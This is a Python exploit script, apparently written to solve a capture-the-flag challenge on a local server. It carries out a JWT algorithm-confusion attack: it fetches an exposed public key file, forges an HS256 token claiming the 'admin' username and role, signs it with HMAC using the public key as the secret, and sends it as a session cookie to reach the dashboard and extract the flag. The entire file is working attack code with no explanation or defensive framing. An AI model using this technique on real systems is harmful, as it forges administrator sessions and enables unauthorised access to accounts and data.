import base64
import json
import hmac
import hashlib
import requests

url = "http://localhost:5000"
key_url = f"{url}/static/assets/pub_cert_v2_backup.pem"

# 1. Fetch Key (Strictly handling bytes)
raw_key = requests.get(key_url).content
public_key_bytes = raw_key.replace(b'\r\n', b'\n')

print(f"[+] Fetched Public Key! Length: {len(public_key_bytes)}")

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    return base64.urlsafe_b64encode(data).replace(b'=', b'').decode('utf-8')

# 2. Forge Header & Payload
header = {"alg": "HS256", "typ": "JWT"}
payload = {"username": "admin", "role": "admin"}

header_b64 = b64url_encode(json.dumps(header, separators=(',', ':')))
payload_b64 = b64url_encode(json.dumps(payload, separators=(',', ':')))

unsigned_token = f"{header_b64}.{payload_b64}"

# 3. Forge HMAC Signature using the Public Key bytes
signature = hmac.new(
    public_key_bytes, 
    unsigned_token.encode('utf-8'), 
    hashlib.sha256
).digest()

signature_b64 = b64url_encode(signature)
forged_token = f"{unsigned_token}.{signature_b64}"

print(f"[+] Forged Token: {forged_token}")

# 4. Fire the Exploit
cookies = {'session_token': forged_token}
response = requests.get(f"{url}/dashboard", cookies=cookies, allow_redirects=False)

if response.status_code == 200 and "CTF{" in response.text:
    print("\n[🎉] CHALLENGE SOLVED! FLAG FOUND:")
    for line in response.text.split('\n'):
        if "CTF{" in line:
            print("     " + line.strip())
else:
    print(f"\n[-] Exploit failed. Status: {response.status_code}")
